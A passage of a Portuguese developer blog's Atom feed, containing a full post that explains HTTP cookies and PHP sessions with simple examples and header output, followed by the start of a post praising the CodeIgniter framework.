&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Code_injection" title="Leia mais sobre as formas de injeção de código no Wikipedia"&gt;&lt;em&gt;Wikipedia: Code Injection&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL" title="Leia mais sobre SQL Injection no Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;: Injeção de &lt;em&gt;SQL&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="segurança"></category><category term="xss"></category><category term="csrf"></category><category term="sql-injection"></category><category term="php-injection"></category><category term="django"></category><category term="php"></category><category term="codeigniter"></category></entry><entry><title>Entendendo os Cookies e Sessões</title><link href="https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html" rel="alternate"></link><published>2012-04-05T16:53:12-03:00</published><updated>2012-04-05T16:53:12-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-04-05:/2012/04/05/entendendo-os-cookies-e-sessoes.html</id><summary type="html">&lt;p&gt;Por muito tempo eu abstrai o conceito de
&lt;em&gt;cookies&lt;/em&gt; e sessões, e nunca cheguei a prestar muita atenção no seu
funcionamento. Recentemente, trabalhando com uma infra mais preocupada
com a segurança, disponibilidade e performance, tive a oportunidade de
relembrar e me aprofundar em alguns conceitos e práticas.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O que já …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Por muito tempo eu abstrai o conceito de
&lt;em&gt;cookies&lt;/em&gt; e sessões, e nunca cheguei a prestar muita atenção no seu
funcionamento. Recentemente, trabalhando com uma infra mais preocupada
com a segurança, disponibilidade e performance, tive a oportunidade de
relembrar e me aprofundar em alguns conceitos e práticas.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O que já sabia é que os &lt;em&gt;cookies&lt;/em&gt; são “persistências temporárias” feitas
no lado do usuário, e sessões são persistências dependentes de
&lt;em&gt;cookies&lt;/em&gt;, mas realizadas no lado do servidor.&lt;/p&gt;
&lt;p&gt;A minha felicidade é que até aí, nada mudou :)&lt;/p&gt;
&lt;h2&gt;Para que servem Cookies e Sessões?&lt;/h2&gt;
&lt;p&gt;O &lt;a href="http://wagnerelias.com/2009/02/06/http-essentials/" title="Conheça mais sobre o protocolo HTTP"&gt;protocolo &lt;em&gt;HTTP&lt;/em&gt;&lt;/a&gt; é &lt;em&gt;stateless&lt;/em&gt;, ou seja, ele não mantém um
estado/conexão. Toda a interação que o seu cliente fizer com um servidor
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; acarretará em uma nova requisição e resposta.&lt;/p&gt;
&lt;p&gt;As requisições são independentes e possuem um tempo de vida (conexão,
envio de mensagem, resposta, encerramento da conexão). O servidor &lt;em&gt;web&lt;/em&gt;
não é capaz de identificar se duas requisições vieram de um mesmo
navegador, e o mesmo não faz nenhum gerenciamento em memória para que
mensagens sejam compartilhadas entre requisições.&lt;/p&gt;
&lt;p&gt;É para suprir esta necessidade que entram os &lt;em&gt;cookies&lt;/em&gt; e sessões.&lt;/p&gt;
&lt;h2&gt;Cookies&lt;/h2&gt;
&lt;p&gt;Através de &lt;em&gt;cookies&lt;/em&gt; o servidor &lt;em&gt;web&lt;/em&gt; é capaz de trocar informações de
estado com o navegador do usuário. Desse modo, somos capazes de
adicionar produtos a um carrinho de compras, sem perder estas
informações ao mudar de página, sair do &lt;em&gt;website&lt;/em&gt; ou até mesmo fechar o
navegador.&lt;/p&gt;
&lt;p&gt;Tecnicamente falando, um &lt;em&gt;cookie&lt;/em&gt; é uma pequena quantidade de informação
persistida temporariamente pelo navegador. Os navegadores normalmente
limitam o tamanho dos &lt;em&gt;cookies&lt;/em&gt; em até 4KB, e apagam &lt;em&gt;cookies&lt;/em&gt; com a
data de “validade vencida”.&lt;/p&gt;
&lt;p&gt;Para entender como essa troca de informação é feita, vamos criar um
&lt;em&gt;cookie&lt;/em&gt; com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="c1"&gt;// cookies.php&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cookie_teste&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Você JÁ passou por aqui!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Você NUNCA passou por aqui.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cookie_teste&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Algum valor...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3600&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O código acima verifica se o &lt;em&gt;cookie&lt;/em&gt; atendendo pelo identificador
&lt;code&gt;cookie_teste&lt;/code&gt; já existe, caso não exista, cria um &lt;em&gt;cookie&lt;/em&gt; com
identificador &lt;code&gt;cookie_teste&lt;/code&gt;, valor &lt;code&gt;Algum valor...&lt;/code&gt; e com &lt;strong&gt;1
hora de vida&lt;/strong&gt; (a hora atual mais 3600 segundos).&lt;/p&gt;
&lt;p&gt;Quando visitamos pela primeira vez o &lt;code&gt;cookies.php&lt;/code&gt;, temos a seguinte
resposta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -I localhost/cookies.php

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Apr &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;:35:33 GMT
Server: Apache/2.2.21 &lt;span class="o"&gt;(&lt;/span&gt;Unix&lt;span class="o"&gt;)&lt;/span&gt; mod_ssl/2.2.21 OpenSSL/0.9.8r DAV/2 PHP/5.3.8
X-Powered-By: PHP/5.3.8
Set-Cookie: &lt;span class="nv"&gt;cookie_teste&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Algum+valor...&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;expires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Wed, &lt;span class="m"&gt;04&lt;/span&gt;-Apr-2012 &lt;span class="m"&gt;01&lt;/span&gt;:35:33 GMT
Content-Type: text/html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Através da função &lt;code&gt;setcookie&lt;/code&gt; do &lt;em&gt;PHP&lt;/em&gt;, estamos enviando um item
chamado &lt;code&gt;Set-Cookie&lt;/code&gt; no cabeçalho &lt;em&gt;HTTP&lt;/em&gt; da resposta. É através deste
que o navegador entende que deve armazenar o valor &lt;code&gt;Algum valor…&lt;/code&gt;,
atendendo pelo identificador &lt;code&gt;cookie_teste&lt;/code&gt;, e que esta informação
expira em 1 hora (verifique a data da requisição e a data de validade do
&lt;em&gt;cookie&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Na próxima vez que o navegador acessar esta &lt;em&gt;URL&lt;/em&gt;, ele verificará se
possui algum &lt;em&gt;cookie&lt;/em&gt; para aquele domínio e &lt;em&gt;path&lt;/em&gt;, caso exista, ele
passa as informações do &lt;em&gt;cookie&lt;/em&gt; no cabeçalho da requisição. Desse modo,
a nossa aplicação é capaz de perceber a existência de um &lt;em&gt;cookie&lt;/em&gt; (no
caso do &lt;em&gt;PHP&lt;/em&gt;, através do &lt;em&gt;array&lt;/em&gt; global &lt;code&gt;$_COOKIE&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Abaixo, um exemplo de requisição utilizando o &lt;em&gt;Google Chrome&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/exemplo-php-cookies.png" width="610" height="315" title="Item cookie no cabeçalho de resposta da requisição HTTP" alt="Item cookie no cabeçalho de resposta da requisição HTTP"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="/images/blog/exemplo-php-cookies.png"&gt;Clique para ampliar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Se excluirmos os &lt;em&gt;cookies&lt;/em&gt;, ou o tempo de expiração for atingido, o
navegador deixa de anexar esta informação ao cabeçalho da requisição.&lt;/p&gt;
&lt;h2&gt;Sessões&lt;/h2&gt;
&lt;p&gt;As sessões têm um princípio similar aos &lt;em&gt;cookies&lt;/em&gt;, só que o
armazenamento do estado é feito pelo servidor &lt;em&gt;web&lt;/em&gt;, e não pelo
navegador.&lt;/p&gt;
&lt;p&gt;Por exemplo, quando construímos uma aplicação que necessita de
autenticação, no momento em que o usuário efetuar o &lt;em&gt;login&lt;/em&gt;, podemos até
permitir que algumas informações sejam armazenadas em um &lt;em&gt;cookie&lt;/em&gt;, mas
dados mais “sensíveis”, como usuário e &lt;em&gt;e-mail&lt;/em&gt;, são mais interessantes
de serem guardadas em sessões. Isto, pois &lt;strong&gt;não é seguro&lt;/strong&gt; que esse tipo
de informação fique “viajando” pela &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Mas se o &lt;em&gt;HTTP&lt;/em&gt; é &lt;em&gt;stateless&lt;/em&gt;, e o servidor &lt;em&gt;web&lt;/em&gt; não tem como
identificar que a requisição anterior veio do meu &lt;em&gt;browser&lt;/em&gt;, como é que
ele sabe que as informações que eu guardei em sessão são de fato minhas?
Simples… &lt;strong&gt;através de &lt;em&gt;cookies&lt;/em&gt;!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Quando iniciamos uma sessão, é enviado um &lt;em&gt;cookie&lt;/em&gt; para o navegador, com
um valor único que corresponde a sessão aberta no servidor &lt;em&gt;web&lt;/em&gt;. Vamos
ilustrar através do exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="c1"&gt;// sessions.php&lt;/span&gt;

    &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Bem vindo &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Você NUNCA passou por aqui.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;João&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O código acima inicia uma sessão através do método &lt;code&gt;session_start&lt;/code&gt;.
Na primeira visita, será criado um índice &lt;code&gt;usuario&lt;/code&gt; com o valor
&lt;code&gt;João&lt;/code&gt;. A resposta da nossa requisição será a seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -I localhost/sessions.php

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Wed, &lt;span class="m"&gt;04&lt;/span&gt; Apr &lt;span class="m"&gt;2012&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:51:57 GMT
Server: Apache/2.2.21 &lt;span class="o"&gt;(&lt;/span&gt;Unix&lt;span class="o"&gt;)&lt;/span&gt; mod_ssl/2.2.21 OpenSSL/0.9.8r DAV/2 PHP/5.3.8
X-Powered-By: PHP/5.3.8
Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4h91dkp7pcp8184nil8rt9ok13&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/
Expires: Thu, &lt;span class="m"&gt;19&lt;/span&gt; Nov &lt;span class="m"&gt;1981&lt;/span&gt; &lt;span class="m"&gt;08&lt;/span&gt;:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;, pre-check&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
Pragma: no-cache
Content-Type: text/html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por partes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Como mencionei, &lt;code&gt;Set-Cookie&lt;/code&gt; foi retornado com um identificador
  (&lt;code&gt;PHPSESSID&lt;/code&gt;) e um valor que corresponde a sessão aberta no
  servidor (&lt;code&gt;4h91dkp7pcp8184nil8rt9ok13&lt;/code&gt;). O complemento &lt;code&gt;path&lt;/code&gt;
  está “dizendo” ao navegador que aquele &lt;em&gt;cookie&lt;/em&gt; tem validade por
  todo o domínio (ou seja, valerá inclusive para outros arquivos &lt;em&gt;PHP&lt;/em&gt;
  em outras subpastas). Quando não é informada a data de expiração, o
  navegador manterá o &lt;em&gt;cookie&lt;/em&gt; até o momento em que ele for fechado.&lt;/li&gt;
&lt;li&gt;O &lt;em&gt;PHP&lt;/em&gt; tomou a liberdade de adicionar alguns cabeçalhos de controle
  de &lt;em&gt;cache&lt;/em&gt; (&lt;code&gt;Expires&lt;/code&gt;, &lt;code&gt;Cache-Control&lt;/code&gt; e &lt;code&gt;Pragma&lt;/code&gt;) à nossa
  resposta. Em resumo, o servidor está dizendo ao navegador para que
  não armazene esta página em &lt;em&gt;cache&lt;/em&gt;. Estes valores podem ser
  alterados em &lt;a href="http://www.php.net/manual/en/ref.session.php" title="PHP: Session functions"&gt;tempo de desenvolvimento&lt;/a&gt;, ou &lt;a href="http://www.php.net/manual/en/session.configuration.php" title="PHP: Runtime configuration"&gt;através do &lt;strong&gt;php.ini&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Em nenhum momento o &lt;em&gt;Apache&lt;/em&gt; informou ao navegador que temos um
  índice &lt;code&gt;usuario&lt;/code&gt; com o valor &lt;code&gt;João&lt;/code&gt;. Estas informações estão
  disponíveis somente no lado do servidor.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Quando visitarmos o &lt;code&gt;sessions.php&lt;/code&gt; novamente, o navegador informará ao
servidor que ele possui um &lt;em&gt;cookie&lt;/em&gt; chamado &lt;code&gt;PHPSESSID&lt;/code&gt;. A partir daí
o &lt;em&gt;PHP&lt;/em&gt; pega o valor deste &lt;em&gt;cookie&lt;/em&gt;, recupera a sessão da memória (ou de
um banco de dados, ou arquivos em disco) e atribui este valor ao &lt;em&gt;array&lt;/em&gt;
global &lt;code&gt;$_SESSION&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;O nome do &lt;em&gt;cookie&lt;/em&gt; varia de linguagem para linguagem e até mesmo de
&lt;em&gt;framework&lt;/em&gt; para &lt;em&gt;framework&lt;/em&gt;. Por exemplo, no &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; ele é chamado
por padrão de &lt;code&gt;sessionid&lt;/code&gt;, no &lt;a href="https://klauslaube.com.br/tag/codeigniter.html" title="Leia mais sobre CodeIgniter"&gt;&lt;em&gt;CodeIgniter&lt;/em&gt;&lt;/a&gt; é chamado de
&lt;code&gt;ci_session&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Gostei muito de me aprofundar um pouquinho mais neste assunto, e gostei
mais ainda de poder traduzir este aprendizado através deste &lt;em&gt;post&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É claro que há alguns cuidados com segurança quando o assunto é
&lt;em&gt;cookies&lt;/em&gt; e sessões, bem como considerações em relação ao uso de
&lt;em&gt;cache&lt;/em&gt;. Pretendo falar mais sobre esses temas em &lt;em&gt;posts&lt;/em&gt; vindouros.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.php.net/manual/en/book.session.php" title="Confira a documentação oficial do PHP que fala sobre Sessões"&gt;&lt;em&gt;PHP Manual – Session Handling&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.stanford.edu/~ouster/cgi-bin/cs142-fall10/lecture.php?topic=cookie" title="Material resumido, mas muito bom, sobre sessões e Cookies"&gt;&lt;em&gt;Stanford.edu – CS 142: Cookies and Session&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wagnerelias.com/2009/02/06/http-essentials/" title="Wagner nos apresenta de forma objetiva o funcionamento do protocolo HTTP"&gt;&lt;em&gt;Wagner Elias&lt;/em&gt; – &lt;em&gt;HTTP Essentials&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wagnerelias.com/2009/04/21/seguranca-de-cookies-de-sessao-e-httponly/" title="Entenda as falhas de segurança apresentadas com o uso de sessões e cookies"&gt;&lt;em&gt;Wagner Elias&lt;/em&gt; – Segurança de &lt;em&gt;Cookies&lt;/em&gt; de sessão e &lt;em&gt;HTTPOnly&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/HTTP_cookie" title="Leia este bom artigo em inglês sobre Cookies"&gt;&lt;em&gt;Wikipedia – HTTP Cookie&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="infraestrutura"></category><category term="web"></category><category term="cookies"></category><category term="sessões"></category><category term="php"></category></entry><entry><title>PHP ágil e divertido com CodeIgniter</title><link href="https://klauslaube.com.br/2012/03/05/php-agil-e-divertido-com-codeigniter.html" rel="alternate"></link><published>2012-03-05T10:06:57-03:00</published><updated>2012-03-05T10:06:57-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-03-05:/2012/03/05/php-agil-e-divertido-com-codeigniter.html</id><summary type="html">&lt;p&gt;Após experimentar &lt;a href="https://klauslaube.com.br/2010/11/27/agilidade-em-php-conhecendo-algumas-frameworks.html" title="Agilidade em PHP: Conhecendo algumas frameworks – Parte 1"&gt;alguns &lt;em&gt;frameworks&lt;/em&gt;&lt;/a&gt; &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;, recentemente tenho
aplicado bastante tempo no estudo do &lt;a href="http://codeigniter.com/" title="CodeIgniter: Open source PHP web application framework"&gt;&lt;strong&gt;CodeIgniter&lt;/strong&gt;&lt;/a&gt;, e tive o prazer de
redescobrir a diversão em programar nessa linguagem um tanto controversa.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Logo de cara, quero recomendar o &lt;em&gt;screencast&lt;/em&gt; da &lt;a href="http://net.tutsplus.com/" title="Web development tutorials, from beginner to advanced"&gt;&lt;em&gt;Nettus+&lt;/em&gt;&lt;/a&gt; chamado
&lt;a href="http://net.tutsplus.com/sessions/codeigniter-from-scratch/" title="Confira a série de screencasts sobre desenvolvimento com PHP e CodeIgniter"&gt;&lt;em&gt;CodeIgniter From Scratch&lt;/em&gt;&lt;/a&gt;. Um excelente material para aprender (e
se aperfeiçoar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Após experimentar &lt;a href="https://klauslaube.com.br/2010/11/27/agilidade-em-php-conhecendo-algumas-frameworks.html" title="Agilidade em PHP: Conhecendo algumas frameworks – Parte 1"&gt;alguns &lt;em&gt;frameworks&lt;/em&gt;&lt;/a&gt; &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;, recentemente tenho
aplicado bastante tempo no estudo do &lt;a href="http://codeigniter.com/" title="CodeIgniter: Open source PHP web application framework"&gt;&lt;strong&gt;CodeIgniter&lt;/strong&gt;&lt;/a&gt;, e tive o prazer de
redescobrir a diversão em programar nessa linguagem um tanto controversa.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Logo de cara, quero recomendar o &lt;em&gt;screencast&lt;/em&gt; da &lt;a href="http://net.tutsplus.com/" title="Web development tutorials, from beginner to advanced"&gt;&lt;em&gt;Nettus+&lt;/em&gt;&lt;/a&gt; chamado
&lt;a href="http://net.tutsplus.com/sessions/codeigniter-from-scratch/" title="Confira a série de screencasts sobre desenvolvimento com PHP e CodeIgniter"&gt;&lt;em&gt;CodeIgniter From Scratch&lt;/em&gt;&lt;/a&gt;. Um excelente material para aprender (e
se aperfeiçoar) a desenvolver aplicações &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; com &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;PHP e MVC&lt;/h2&gt;
&lt;p&gt;Não há mistérios na forma como o &lt;em&gt;CodeIgniter&lt;/em&gt; trabalha com o &lt;a href="http://pt.wikipedia.org/wiki/MVC" title="Leia mais sobre Model-View-Controller"&gt;&lt;em&gt;MVC&lt;/em&gt;&lt;/a&gt;,
utilizando o “&lt;em&gt;MVC&lt;/em&gt; clássico”, com as rotas baseadas nos nomes do
controlador e das &lt;em&gt;actions&lt;/em&gt;, modelos com &lt;a href="http://pt.wikipedia.org/wiki/Mapeamento_objeto-relacional" title="Leia mais sobre Mapeamento Objeto-Relacional"&gt;&lt;em&gt;ORM&lt;/em&gt;&lt;/a&gt; através da
&lt;a href="http://www.phpactiverecord.org/" title="Faça ORM em PHP com a ActiveRecord"&gt;&lt;em&gt;ActiveRecord&lt;/em&gt;&lt;/a&gt;, e &lt;em&gt;views&lt;/em&gt; utilizando a linguagem natural do &lt;em&gt;PHP&lt;/em&gt;
para gerar a visualização das suas páginas.&lt;/p&gt;
&lt;p&gt;E este último, acredito ser uma das grandes vantagens do &lt;em&gt;PHP&lt;/em&gt; com
&lt;em&gt;MVC&lt;/em&gt;. Escrever &lt;em&gt;views&lt;/em&gt; com &lt;em&gt;PHP&lt;/em&gt; é muito mais “natural” do que em
qualquer outra linguagem (claro, se você entende de &lt;em&gt;PHP&lt;/em&gt;). Não é
necessário aprender nenhuma “linguagem de template”, como em alguns
&lt;em&gt;frameworks&lt;/em&gt;, pois é normal escrever o &lt;em&gt;PHP&lt;/em&gt; “mesclado” ao &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Em comparação à &lt;a href="http://cakephp.org/" title="Conheça a CakePHP"&gt;&lt;em&gt;CakePHP&lt;/em&gt;&lt;/a&gt; ou à &lt;a href="http://framework.zend.com/" title="Conheça a poderosa Zend"&gt;&lt;em&gt;Zend Framework&lt;/em&gt;&lt;/a&gt;, a verdade é que
o &lt;em&gt;CodeIgniter&lt;/em&gt; é relativamente “seco”. Ou seja, temos menos “recursos
mágicos” e somos obrigados a por a “mão na massa de verdade” em algumas
situações. Embora isso seja encarado como um ponto negativo por alguns,
essa característica acaba resultando em maior performance e
simplicidade.&lt;/p&gt;
&lt;h2&gt;Performance&lt;/h2&gt;
&lt;p&gt;A partir da versão &lt;strong&gt;2.0&lt;/strong&gt;, o &lt;em&gt;CodeIgniter&lt;/em&gt; deixou de dar suporte ao
&lt;em&gt;PHP 4&lt;/em&gt;, o que alavancou a sua performance (já que não é mais necessário criar
&lt;em&gt;fallbacks&lt;/em&gt; para os recursos do &lt;em&gt;PHP 5&lt;/em&gt;). Essa decisão permite que o
&lt;em&gt;framework&lt;/em&gt; rume cada vez mais para o caminho da &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre OOP"&gt;Orientação a Objetos&lt;/a&gt;,
e que torne a nossa vida cada dia mais simples :)&lt;/p&gt;
&lt;p&gt;E performance é uma das qualidades e diferenciais do &lt;em&gt;CodeIgniter&lt;/em&gt;.
Segundo o &lt;a href="https://github.com/darkredz/Web-Framework-Benchmark/blob/master/benchmark.png" title="Veja o repositório no GitHub do benchmark"&gt;&lt;em&gt;benchmark&lt;/em&gt; realizado por &lt;em&gt;Leng Sheng Hong&lt;/em&gt;&lt;/a&gt;, o
&lt;em&gt;CodeIgniter&lt;/em&gt; fica atrás apenas do (também excelente) &lt;em&gt;DooPHP&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/benchmark-php.png" width="610" height="365" title="Comparativo entre Frameworks PHP" alt="Comparativo entre Frameworks PHP"&gt;&lt;/p&gt;
&lt;p&gt;Em tempos onde performance e disponibilidade são premissas, e não mais
diferenciais, ter uma boa ferramenta ao seu lado facilita muito o
trabalho de atender a essas expectativas.&lt;/p&gt;
&lt;h2&gt;Simplicidade&lt;/h2&gt;
&lt;p&gt;Essa qualidade eu descobri recentemente, quando tive que usar a
&lt;a href="https://github.com/facebook/php-sdk" title="Conheça a SDK-PHP do Facebook, no GitHub"&gt;&lt;em&gt;SDK&lt;/em&gt; do &lt;em&gt;Facebook&lt;/em&gt;&lt;/a&gt; para desenvolver uma aplicação social com o
&lt;em&gt;CodeIgniter&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Foi tão simples quanto jogar a classe como uma biblioteca, fazer alguns
ajustes de nomenclatura e construção, e pronto! Estava pronta para usar,
dentro da estrutura e fluxo do &lt;em&gt;CodeIgniter&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Estender o &lt;em&gt;framework&lt;/em&gt; é simples e prático. Escrever &lt;em&gt;hooks&lt;/em&gt; e &lt;em&gt;helpers&lt;/em&gt;
é tão natural quanto escrever funções. Essa simplicidade vem aliada a
uma coleção de &lt;em&gt;features&lt;/em&gt; prontas disponíveis com o &lt;em&gt;core&lt;/em&gt; do
&lt;em&gt;framework&lt;/em&gt;. Também vale mencionar a facilidade de configuração e
instalação.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Se você procura um &lt;em&gt;framework PHP&lt;/em&gt; simples, que não seja tão “mágico” e
